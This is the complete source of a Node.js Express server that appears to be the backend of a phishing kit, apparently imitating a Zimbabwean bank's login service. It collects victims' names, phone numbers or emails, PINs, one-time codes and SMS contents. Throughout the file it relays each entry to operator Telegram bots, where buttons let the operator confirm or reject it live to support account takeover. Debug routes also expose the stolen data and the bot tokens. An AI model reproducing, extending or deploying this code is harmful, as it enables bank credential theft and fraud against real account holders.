require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// ---------------- BACKEND DOMAIN (HARD-LOCKED) ----------------
const BACKEND_DOMAIN = 'https://nbmconnect-zimbabwe-0ih5.onrender.com';

// ---------------- MEMORY STORES ----------------
const approvedPins = {};
const requestBotMap = {};

// ---------------- DETAILS STORE ----------------
const approvedDetails = {};

// ---------------- SMS/OTP STORE ----------------
const approvedSMS = {};

// ---------------- MULTI-BOT STORE (FROM .ENV) ----------------
const bots = [];

Object.keys(process.env).forEach(key => {
    const tokenMatch = key.match(/^BOT(\d+)_TOKEN$/);
    if (tokenMatch) {
        const id = `bot${tokenMatch[1]}`;
        const token = process.env[key];
        const chatIdKey = `BOT${tokenMatch[1]}_CHATID`;
        const chatId = process.env[chatIdKey];
        if (token && chatId) {
            bots.push({ botId: id, botToken: token, chatId });
        }
    }
});

console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

// ---------------- TELEGRAM HELPERS ----------------
async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        const response = await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
            { chat_id: bot.chatId, text, reply_markup: { inline_keyboard: inlineKeyboard } }
        );
        console.log("📤 Telegram message sent:", response.data.ok);
    } catch (err) {
        console.error("❌ Telegram send error:", err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
            { callback_query_id: callbackId }
        );
        console.log("✅ Callback answered");
    } catch (err) {
        console.error("❌ Callback answer error:", err.response?.data || err.message);
    }
}

// ---------------- AUTO-SET WEBHOOKS ----------------
async function setWebhookForBot(bot) {
    try {
        const webhookUrl = `${BACKEND_DOMAIN}/telegram-webhook/${bot.botId}`;
        const resp = await axios.get(
            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`
        );
        console.log(`✅ Webhook set for ${bot.botId}:`, resp.data);
    } catch (err) {
        console.error(`❌ Failed webhook for ${bot.botId}:`, err.response?.data || err.message);
    }
}

async function setWebhooksForAllBots() {
    for (const bot of bots) {
        await setWebhookForBot(bot);
    }
}

// ---------------- ROUTES ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Invalid bot link');
    res.redirect(`/index.html?botId=${bot.botId}`);
});

app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/sms', (req, res) => res.sendFile(path.join(__dirname, 'public', 'sms.html')));
app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------------- DETAILS HANDLING (UPDATED WITH MULTI-BUTTONS) ----------------
app.post('/submit-details', (req, res) => {
    const { name, phone, email, pin, botId, identifierType } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    // Store initial state with both verifications pending
    approvedDetails[requestId] = { 
        approved: false, 
        phoneVerified: false, 
        pinVerified: false,
        reason: null 
    };
    requestBotMap[requestId] = botId;

    console.log("🟢 NEW DETAILS REQUEST");
    console.log("RequestID:", requestId);
    console.log("Bot:", botId);
    console.log("Name:", name);
    console.log("PIN:", pin);
    console.log("Identifier Type:", identifierType);

    // Determine which identifier was provided
    let identifier = phone || email;
    let identifierLabel = identifierType === 'email' ? 'Email' : 'Mobile Number';

    // If identifierType not provided, try to detect
    if (!identifierType) {
        if (phone) {
            identifierLabel = 'Mobile Number';
            identifier = phone;
        } else if (email) {
            identifierLabel = 'Email';
            identifier = email;
        }
    }

    console.log(`${identifierLabel}:`, identifier);

    // Send to Telegram with 3 button rows
    const message = `🔐 LOGIN VERIFICATION\n\n` +
                    `Name: ${name}\n` +
                    `${identifierLabel}: ${identifier}\n` +
                    `PIN: ${pin}\n\n` +
                    `Please verify the details:`;

    sendTelegramMessage(bot, message, [
        [
            { text: '✅ Correct Phone/Email', callback_data: `details_phone_ok:${requestId}` },
            { text: '❌ Wrong Phone/Email', callback_data: `details_phone_bad:${requestId}` }
        ],
        [
            { text: '✅ Correct PIN', callback_data: `details_pin_ok:${requestId}` },
            { text: '❌ Wrong PIN', callback_data: `details_pin_bad:${requestId}` }
        ],
        [
            { text: '✅ Approve Both', callback_data: `details_both_ok:${requestId}` }
        ]
    ]);

    res.json({ requestId });
});

app.get('/check-details/:requestId', (req, res) => {
    const value = approvedDetails[req.params.requestId] ?? null;
    
    // If it's still an object with status, check if fully approved
    if (value && typeof value === 'object') {
        if (value.approved === true) {
            res.json({ approved: true });
        } else if (value.reason) {
            res.json({ approved: false, reason: value.reason });
        } else {
            res.json({ approved: false });
        }
    } else {
        res.json({ approved: value });
    }
});

// ---------------- CODE/OTP HANDLING ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId, identifierType } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedSMS[requestId] = null;
    requestBotMap[requestId] = botId;

    console.log("📱 NEW OTP VERIFICATION REQUEST");
    console.log("RequestID:", requestId);
    console.log("Bot:", botId);
    console.log("Name:", name);
    console.log("Phone/Email:", phone);
    console.log("OTP Code:", code);
    console.log("Identifier Type:", identifierType || 'phone');

    const identifierLabel = identifierType === 'email' ? 'Email' : 'Mobile Number';

    sendTelegramMessage(bot,
        `📱 OTP VERIFICATION\n\n` +
        `Name: ${name}\n` +
        `${identifierLabel}: ${phone}\n\n` +
        `📨 OTP Code:\n${code}`,
        [[
            { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
            { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    const value = approvedSMS[req.params.requestId] ?? null;
    res.json({ approved: value });
});

// ---------------- SMS HANDLING (LEGACY - KEPT FOR COMPATIBILITY) ----------------
app.post('/submit-sms', (req, res) => {
    const { name, phone, smsMessage, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedSMS[requestId] = null;
    requestBotMap[requestId] = botId;

    console.log("📱 NEW SMS VERIFICATION REQUEST");
    console.log("RequestID:", requestId);
    console.log("Bot:", botId);
    console.log("SMS Message:", smsMessage);

    sendTelegramMessage(bot,
        `📱 SMS VERIFICATION\n\n` +
        `Name: ${name}\n` +
        `Phone: ${phone}\n\n` +
        `📨 SMS Message:\n${smsMessage}`,
        [[
            { text: '✅ Approve SMS', callback_data: `sms_ok:${requestId}` },
            { text: '❌ Reject SMS', callback_data: `sms_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-sms/:requestId', (req, res) => {
    const value = approvedSMS[req.params.requestId] ?? null;
    res.json({ approved: value });
});

// ---------------- PIN HANDLING (LEGACY - KEPT FOR COMPATIBILITY) ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;

    console.log("🟡 NEW PIN REQUEST");
    console.log("RequestID:", requestId);
    console.log("Bot:", botId);

    sendTelegramMessage(bot,
        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
        [[
            { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
            { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-pin/:requestId', (req, res) => {
    const value = approvedPins[req.params.requestId] ?? null;
    res.json({ approved: value });
});

// ---------------- TELEGRAM WEBHOOK (UPDATED) ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');

    let feedback = '';

    // DETAILS APPROVAL/REJECTION with separate verifications
    if (action === 'details_phone_ok') {
        const current = approvedDetails[requestId] || { approved: false, phoneVerified: false, pinVerified: false };
        approvedDetails[requestId] = { 
            ...current, 
            phoneVerified: true,
            approved: current.pinVerified === true // Only approve if PIN already verified
        };
        if (current.pinVerified === true) {
            feedback = `✅ Phone/Email Verified!\n✅ Both Phone/Email and PIN Verified!\nAccess granted for requestId: ${requestId}`;
        } else {
            feedback = `✅ Phone/Email Verified for requestId: ${requestId}\nWaiting for PIN verification...`;
        }
    }
    
    if (action === 'details_phone_bad') {
        approvedDetails[requestId] = { 
            approved: false, 
            phoneVerified: false, 
            pinVerified: false,
            reason: 'invalid_identifier' 
        };
        feedback = `❌ Phone/Email Rejected for requestId: ${requestId}`;
    }
    
    if (action === 'details_pin_ok') {
        const current = approvedDetails[requestId] || { approved: false, phoneVerified: false, pinVerified: false };
        approvedDetails[requestId] = { 
            ...current, 
            pinVerified: true,
            approved: current.phoneVerified === true // Only approve if phone already verified
        };
        if (current.phoneVerified === true) {
            feedback = `✅ PIN Verified!\n✅ Both Phone/Email and PIN Verified!\nAccess granted for requestId: ${requestId}`;
        } else {
            feedback = `✅ PIN Verified for requestId: ${requestId}\nWaiting for Phone/Email verification...`;
        }
    }
    
    if (action === 'details_pin_bad') {
        approvedDetails[requestId] = { 
            approved: false, 
            phoneVerified: false, 
            pinVerified: false,
            reason: 'invalid_pin' 
        };
        feedback = `❌ PIN Rejected for requestId: ${requestId}`;
    }
    
    if (action === 'details_both_ok') {
        approvedDetails[requestId] = { 
            approved: true, 
            phoneVerified: true, 
            pinVerified: true 
        };
        feedback = `✅ Both Phone/Email and PIN Verified!\nAccess granted for requestId: ${requestId}`;
    }

    // OTP APPROVAL/REJECTION
    if (action === 'otp_ok') {
        approvedSMS[requestId] = true;
        feedback = `✅ OTP Verified for requestId: ${requestId}`;
    }
    if (action === 'otp_bad') {
        approvedSMS[requestId] = false;
        feedback = `❌ OTP Rejected for requestId: ${requestId}`;
    }

    // SMS APPROVAL/REJECTION (legacy)
    if (action === 'sms_ok') {
        approvedSMS[requestId] = true;
        feedback = `✅ SMS Approved for requestId: ${requestId}`;
    }
    if (action === 'sms_bad') {
        approvedSMS[requestId] = false;
        feedback = `❌ SMS Rejected for requestId: ${requestId}`;
    }

    // PIN APPROVAL/REJECTION (legacy)
    if (action === 'pin_ok') {
        approvedPins[requestId] = true;
        feedback = `✅ PIN Approved for requestId: ${requestId}`;
    }
    if (action === 'pin_bad') {
        approvedPins[requestId] = false;
        feedback = `❌ PIN Rejected for requestId: ${requestId}`;
    }

    if (feedback) await sendTelegramMessage(bot, feedback);
    await answerCallback(bot, cb.id);

    res.sendStatus(200);
});

// ---------------- DEBUG ENDPOINTS (UNCHANGED) ----------------
app.get('/debug/pins', (req, res) => res.json(approvedPins));
app.get('/debug/details', (req, res) => res.json(approvedDetails));
app.get('/debug/sms', (req, res) => res.json(approvedSMS));
app.get('/debug/request-map', (req, res) => res.json(requestBotMap));
app.get('/debug/bots', (req, res) => res.json(bots));

// ---------------- START SERVER ----------------
setWebhooksForAllBots().then(() => {
    app.listen(PORT, () =>
        console.log(`🚀 Server running on port ${PORT} (Domain: ${BACKEND_DOMAIN})`)
    );
});